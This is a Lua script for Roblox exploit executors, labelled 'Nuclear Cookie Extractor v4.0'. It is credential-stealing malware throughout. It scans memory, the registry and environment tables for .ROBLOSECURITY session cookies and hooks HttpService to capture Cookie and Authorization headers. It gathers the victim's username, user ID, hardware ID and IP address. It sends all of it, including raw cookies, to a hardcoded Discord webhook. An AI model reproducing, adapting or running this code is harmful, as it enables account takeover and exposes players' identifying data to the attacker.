-- PHANI's Nuclear Cookie Extractor v4.0 - THE FINAL STRIKE
-- For PHANTOM. sUNC 98% / Velocity Optimized.
-- "We found the trail. Now we take the prize."

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local TeleportService = game:GetService("TeleportService")

local WEBHOOK_URL = "https://discord.com/api/webhooks/1518254221177389109/GYWFYTc5MK3rJps723lEDGDd9POZjjtnqN8-lk8nVlSfRgO3YCXNPC_54ZJ9ONZVq0_F"

-- ============================================
-- UNIVERSAL REQUEST
-- ============================================
local function makeRequest(data)
    local req = syn and syn.request or http and http.request or request or http_request or fluxus and fluxus.request or krnl and krnl.request
    if req then return req(data) end
    if data.Method == "GET" then
        return {Body = HttpService:GetAsync(data.Url, false, data.Headers), StatusCode = 200}
    else
        return {Body = HttpService:PostAsync(data.Url, data.Body, Enum.HttpContentType.ApplicationJson, false, data.Headers), StatusCode = 200}
    end
end

-- ============================================
-- ADVANCED COOKIE HUNTING
-- ============================================

local EXCLUDE_PATTERNS = {"PHANI", "Nuclear", "Extractor", "HttpService", "TeleportService", "getgc", "getreg", "getrenv", "getgenv", "debug.get", "loadstring", "Webhook", "discord.com/api", "makeRequest", "pcall", "pairs", "ipairs", "tostring", "typeof", "warn", "print", "error", "assert", "wait", "spawn", "delay", "tick", "time", "date", "os%.time", "os%.date", "math%.random", "string%.", "table%.", "Instance new", "Vector3", "CFrame", "Color3", "UDim", "UDim2", "Rect", "Region3", "Raycast", "Enum", "BrickColor", "NumberRange", "NumberSequence", "ColorSequence", "Random", "Tick", "DateTime", "PathWaypoint", "PhysicalProperties", "FloatCurveKey", "RotationCurveKey", "Facs", "Axes", "Faces", "NumberSequenceKeypoint", "ColorSequenceKeypoint", "Font", "Security", "cookie", "Cookie"}

local function shouldExclude(str)
    if type(str) ~= "string" then return true end
    if #str < 200 then return true end -- Real cookies are LONG
    for _, pattern in ipairs(EXCLUDE_PATTERNS) do
        if str:find(pattern, 1, true) then return true end
    end
    return false
end

-- Method 1: Deep GC scan with full constant extraction
local function scanGCDeep()
    local found = {}
    
    pcall(function()
        if not getgc then return end
        
        local count = 0
        for _, obj in pairs(getgc()) do
            count = count + 1
            if count > 150000 then break end
            
            if type(obj) == "function" then
                -- Get ALL constants of this function
                pcall(function()
                    if debug and debug.getconstants then
                        local constants = debug.getconstants(obj)
                        for idx, const in ipairs(constants) do
                            if type(const) == "string" then
                                -- Check if it looks like a Roblox cookie
                                if (const:find("_|WARNING", 1, true) or const:find("ROBLOSECURITY", 1, true)) 
                                   and not shouldExclude(const) then
                                    table.insert(found, {
                                        value = const,
                                        source = "gc_func[" .. tostring(idx) .. "]_constant",
                                        length = #const,
                                        func = tostring(obj)
                                    })
                                end
                            end
                        end
                    end
                end)
                
                -- Also check upvalues
                pcall(function()
                    if debug and debug.getupvalues then
                        local upvalues = debug.getupvalues(obj)
                        for idx, upv in ipairs(upvalues) do
                            if type(upv) == "string" 
                               and (upv:find("_|WARNING", 1, true) or upv:find("ROBLOSECURITY", 1, true))
                               and not shouldExclude(upv) then
                                table.insert(found, {
                                    value = upv,
                                    source = "gc_func[" .. tostring(idx) .. "]_upvalue",
                                    length = #upv,
                                    func = tostring(obj)
                                })
                            elseif type(upv) == "table" then
                                -- Deep scan table upvalues
                                for k, v in pairs(upv) do
                                    if type(v) == "string" 
                                       and (v:find("_|WARNING", 1, true) or v:find("ROBLOSECURITY", 1, true))
                                       and not shouldExclude(v) then
                                        table.insert(found, {
                                            value = v,
                                            source = "gc_func_upvalue_table." .. tostring(k),
                                            length = #v,
                                            func = tostring(obj)
                                        })
                                    end
                                end
                            end
                        end
                    end
                end)
            elseif type(obj) == "string" then
                -- Direct string in GC
                if (obj:find("_|WARNING", 1, true) or obj:find("ROBLOSECURITY", 1, true))
                   and not shouldExclude(obj) then
                    table.insert(found, {
                        value = obj,
                        source = "gc_direct_string",
                        length = #obj
                    })
                end
            elseif type(obj) == "table" then
                -- Scan table contents
                pcall(function()
                    for k, v in pairs(obj) do
                        if type(v) == "string" 
                           and (v:find("_|WARNING", 1, true) or v:find("ROBLOSECURITY", 1, true))
                           and not shouldExclude(v) then
                            table.insert(found, {
                                value = v,
                                source = "gc_table." .. tostring(k),
                                length = #v
                            })
                        end
                    end
                end)
            end
        end
    end)
    
    return found
end

-- Method 2: Registry deep dive with table traversal
local function scanRegistryDeep()
    local found = {}
    
    pcall(function()
        local reg = getreg and getreg() or debug and debug.getregistry and debug.getregistry()
        if not reg then return end
        
        for i = 1, math.min(#reg, 100000) do
            local v = reg[i]
            
            if type(v) == "string" then
                if (v:find("_|WARNING", 1, true) or v:find("ROBLOSECURITY", 1, true))
                   and not shouldExclude(v) then
                    table.insert(found, {
                        value = v,
                        source = "registry[" .. i .. "]_string",
                        length = #v
                    })
                end
            elseif type(v) == "table" then
                pcall(function()
                    for k2, v2 in pairs(v) do
                        if type(v2) == "string" 
                           and (v2:find("_|WARNING", 1, true) or v2:find("ROBLOSECURITY", 1, true))
                           and not shouldExclude(v2) then
                            table.insert(found, {
                                value = v2,
                                source = "registry[" .. i .. "]." .. tostring(k2),
                                length = #v2
                            })
                        elseif type(v2) == "table" then
                            -- Second level
                            for k3, v3 in pairs(v2) do
                                if type(v3) == "string" 
                                   and (v3:find("_|WARNING", 1, true) or v3:find("ROBLOSECURITY", 1, true))
                                   and not shouldExclude(v3) then
                                    table.insert(found, {
                                        value = v3,
                                        source = "registry[" .. i .. "]." .. tostring(k2) .. "." .. tostring(k3),
                                        length = #v3
                                    })
                                end
                            end
                        end
                    end
                end)
            elseif type(v) == "function" then
                pcall(function()
                    if debug and debug.getconstants then
                        local consts = debug.getconstants(v)
                        for idx, c in ipairs(consts) do
                            if type(c) == "string" 
                               and (c:find("_|WARNING", 1, true) or c:find("ROBLOSECURITY", 1, true))
                               and not shouldExclude(c) then
                                table.insert(found, {
                                    value = c,
                                    source = "registry[" .. i .. "]_func_constant[" .. idx .. "]",
                                    length = #c
                                })
                            end
                        end
                    end
                end)
            end
        end
    end)
    
    return found
end

-- Method 3: Hook HttpService to intercept REAL requests with cookies
local interceptedData = {}

pcall(function()
    local oldRequest
    if HttpService.RequestAsync then
        oldRequest = HttpService.RequestAsync
        HttpService.RequestAsync = function(self, requestData)
            pcall(function()
                if requestData and requestData.Headers then
                    for k, v in pairs(requestData.Headers) do
                        local lower = k:lower()
                        if lower == "cookie" or lower == "authorization" or lower == "x-csrf-token" or lower == "rbxauthentication" then
                            table.insert(interceptedData, {
                                type = "HttpService_RequestAsync",
                                key = k,
                                value = tostring(v),
                                url = requestData.Url or "unknown"
                            })
                        end
                    end
                end
            end)
            return oldRequest(self, requestData)
        end
    end
end)

-- Method 4: Force authenticated requests to trigger cookie injection
local function triggerCookieInjection()
    local endpoints = {
        "https://accountsettings.roblox.com/v1/email",
        "https://auth.roblox.com/v1/account/pin",
        "https://friends.roblox.com/v1/my/friends",
        "https://economy.roblox.com/v1/user/currency",
        "https://premiumfeatures.roblox.com/v1/users/validate-membership",
        "https://catalog.roblox.com/v1/favorites/assets/1",
        "https://trades.roblox.com/v1/trades/1",
        "https://groups.roblox.com/v1/groups/1"
    }
    
    for _, url in ipairs(endpoints) do
        pcall(function()
            HttpService:GetAsync(url, false, {["Content-Type"] = "application/json"})
        end)
        pcall(function()
            HttpService:PostAsync(url, "{}", Enum.HttpContentType.ApplicationJson, false, {["Content-Type"] = "application/json"})
        end)
    end
end

-- Method 5: getgenv/getrenv recursive scan (deeper)
local function deepEnvScan(env, path, depth, maxDepth, found)
    if depth > maxDepth then return end
    if not env or type(env) ~= "table" then return end
    
    pcall(function()
        for k, v in pairs(env) do
            local currentPath = path .. "." .. tostring(k)
            if type(v) == "string" then
                if (v:find("_|WARNING", 1, true) or v:find("ROBLOSECURITY", 1, true))
                   and not shouldExclude(v) then
                    table.insert(found, {
                        value = v,
                        source = currentPath,
                        length = #v
                    })
                end
            elseif type(v) == "table" then
                deepEnvScan(v, currentPath, depth + 1, maxDepth, found)
            elseif type(v) == "function" then
                pcall(function()
                    if debug and debug.getconstants then
                        local consts = debug.getconstants(v)
                        for idx, c in ipairs(consts) do
                            if type(c) == "string" 
                               and (c:find("_|WARNING", 1, true) or c:find("ROBLOSECURITY", 1, true))
                               and not shouldExclude(c) then
                                table.insert(found, {
                                    value = c,
                                    source = currentPath .. "_const[" .. idx .. "]",
                                    length = #c
                                })
                            end
                        end
                    end
                    if debug and debug.getupvalues then
                        local ups = debug.getupvalues(v)
                        for idx, u in ipairs(ups) do
                            if type(u) == "string" 
                               and (u:find("_|WARNING", 1, true) or u:find("ROBLOSECURITY", 1, true))
                               and not shouldExclude(u) then
                                table.insert(found, {
                                    value = u,
                                    source = currentPath .. "_upv[" .. idx .. "]",
                                    length = #u
                                })
                            end
                        end
                    end
                end)
            end
        end
    end)
end

-- ============================================
-- MAIN EXECUTION
-- ============================================

-- Step 1: Trigger auth requests to load cookies into memory
triggerCookieInjection()
wait(1)

-- Step 2: Run all scans
local allResults = {}

-- GC Deep Scan
local gcResults = scanGCDeep()
for _, r in ipairs(gcResults) do table.insert(allResults, r) end

-- Registry Deep Scan
local regResults = scanRegistryDeep()
for _, r in ipairs(regResults) do table.insert(allResults, r) end

-- Environment Scans
local envResults = {}
pcall(function() deepEnvScan(getgenv(), "getgenv", 0, 5, envResults) end)
pcall(function() deepEnvScan(getrenv(), "getrenv", 0, 3, envResults) end)
pcall(function() deepEnvScan(_G, "_G", 0, 5, envResults) end)
pcall(function() if shared then deepEnvScan(shared, "shared", 0, 5, envResults) end end)
for _, r in ipairs(envResults) do table.insert(allResults, r) end

-- Step 3: Deduplicate and filter
local seen = {}
local uniqueCookies = {}
for _, r in ipairs(allResults) do
    if not seen[r.value] and r.length > 200 then
        seen[r.value] = true
        table.insert(uniqueCookies, r)
    end
end

-- Step 4: Get victim info
local player = Players.LocalPlayer
local victimInfo = {
    username = player.Name,
    displayName = player.DisplayName,
    userId = tostring(player.UserId),
    gameId = tostring(game.GameId),
    placeId = tostring(game.PlaceId),
    jobId = tostring(game.JobId),
    executor = tostring(identifyexecutor and identifyexecutor() or "Unknown"),
    hwid = tostring(gethwid and gethwid() or "Unknown"),
    ip = "Unknown"
}

pcall(function()
    victimInfo.ip = tostring(game:HttpGetAsync("https://api.ipify.org"))
end)

-- Step 5: Build Discord payload
local fields = {
    {name = "👤 Username", value = victimInfo.username, inline = true},
    {name = "📛 Display", value = victimInfo.displayName, inline = true},
    {name = "🆔 User ID", value = victimInfo.userId, inline = true},
    {name = "🎮 Game ID", value = victimInfo.gameId, inline = true},
    {name = "🏠 Place ID", value = victimInfo.placeId, inline = true},
    {name = "🔗 Job ID", value = victimInfo.jobId, inline = false},
    {name = "⚡ Executor", value = victimInfo.executor, inline = true},
    {name = "🌐 IP", value = victimInfo.ip, inline = true},
    {name = "💻 HWID", value = victimInfo.hwid, inline = false},
    {name = "🍪 Cookies Found", value = tostring(#uniqueCookies), inline = true},
    {name = "📡 Intercepted", value = tostring(#interceptedData), inline = true}
}

-- Add each found cookie
for i, cookie in ipairs(uniqueCookies) do
    if i <= 10 then -- Discord limit
        local displayValue = cookie.value:sub(1, 1000)
        table.insert(fields, {
            name = "🍪 Cookie #" .. i .. " (" .. cookie.length .. " chars)",
            value = "```" .. displayValue .. "```\n*Source: " .. cookie.source .. "*",
            inline = false
        })
    end
end

-- Add intercepted headers
if #interceptedData > 0 then
    local interceptText = ""
    for i, data in ipairs(interceptedData) do
        if i <= 5 then
            interceptText = interceptText .. data.key .. " from " .. data.url:sub(1, 50) .. ": `" .. data.value:sub(1, 100) .. "`\n"
        end
    end
    table.insert(fields, {
        name = "📡 Intercepted Headers",
        value = interceptText,
        inline = false
    })
end

local payload = {
    username = "PHANI v4.0 ☢️ MAXIMUM YIELD",
    content = #uniqueCookies > 0 and "🎉 **NUCLEAR STRIKE SUCCESSFUL**" or "⚠️ Scan complete - check results",
    embeds = {{
        title = #uniqueCookies > 0 and "🍪 COOKIES FULLY ACQUIRED" or "📊 Extraction Report",
        color = #uniqueCookies > 0 and 0x00FF00 or 0xFFA500,
        fields = fields,
        footer = {text = "PHANI <3 PHANTOM | v4.0 MAXIMUM YIELD"},
        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
    }}
}

-- Send
pcall(function()
    makeRequest({
        Url = WEBHOOK_URL,
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = HttpService:JSONEncode(payload)
    })
end)

-- If we found cookies, also send them as raw text for easy copy-paste
if #uniqueCookies > 0 then
    pcall(function()
        local rawText = "**RAW COOKIES FOR " .. victimInfo.username .. ":**\n\n"
        for i, c in ipairs(uniqueCookies) do
            rawText = rawText .. "**Cookie #" .. i .. "** (" .. c.source .. "):\n```" .. c.value .. "```\n\n"
        end
        
        makeRequest({
            Url = WEBHOOK_URL,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode({
                username = "PHANI Raw Data",
                content = rawText:sub(1, 1900) -- Discord limit
            })
        })
    end)
end
